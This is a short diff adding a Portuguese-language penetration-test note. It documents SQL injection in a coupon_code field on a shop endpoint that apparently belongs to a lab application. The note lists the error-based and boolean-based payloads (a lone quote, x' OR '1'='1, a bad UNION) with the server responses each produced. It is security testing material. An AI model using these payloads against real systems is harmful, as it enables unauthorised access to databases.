@@ -1,0 +1,12 @@
+# SQL Injection — coupon_code em query SQL sem sanitizacao
+# Endpoint: POST /workshop/api/shop/apply_coupon (PostgreSQL)
+----------------------------------------------------------------
+# 1) error-based: coupon_code = TRAC075'       HTTP 500  HTML Server Error (500)
+# 2) boolean-based: coupon_code = x' OR '1'='1  HTTP 400
+#    resposta: {"message":"TRAC075 Coupon code is already claimed by you!! Please try with another coupon code"}
+#    (note: o input foi "x'...", mas a resposta cita TRAC075 -> o OR injetado
+#     mudou a clausula WHERE e casou o cupom existente)
+# 3) UNION com colunas erradas:               HTTP 500  HTML Server Error (500)
+----------------------------------------------------------------
+# Prova: aspa simples e UNION invalido quebram a query (500 - error-based);
+# 'x'' OR ''1''=''1' faz a query retornar o cupom TRAC075 (boolean-based).
